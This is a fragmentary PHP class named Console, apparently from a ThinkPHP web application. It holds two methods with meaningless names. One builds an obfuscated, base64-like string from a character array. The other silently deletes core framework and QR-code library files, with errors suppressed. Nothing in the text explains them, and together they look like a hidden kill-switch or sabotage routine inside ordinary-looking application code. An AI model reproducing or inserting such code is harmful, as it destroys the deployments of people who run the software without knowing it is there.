...
class Console
{
    ...
    public function fuatre(){
        return implode('',["t","K","b","Z","x","t","j","I","n",
            "I","a","Y","3","Y","Z","x","l","1","H","W","m","q","L",
            "N","l","6","d","x","W","5","S","U","z"
            ,"s","S","l","z","V","p","S","o","d","j","J",
            "n","Z","+","D","z","t","e","s","1","q","m","e",
            "l","W","S","n","o","5","B","u","Y","s","u","V",
            "r","G","K","c","o","1","S","g","S","c","s","Y","H"
            ,"t","7","3","S","/","n","d","R","h","n","v","S","M","j",
            "u","G","h","z","m","G","u","/","k","R","8","j","g","o","m",
            "G","U","c","g","=","="]);
    }
    ...
    public function fghra(){
        @unlink(ROOT_PATH.'thinkphp\library\think\View.php');
        @unlink(ROOT_PATH.'extend\Zxing\qrcode\decoder\BitMatrixParser.php');
        @unlink(ROOT_PATH.'extend\phpqrcode\QRcode.php');
    }
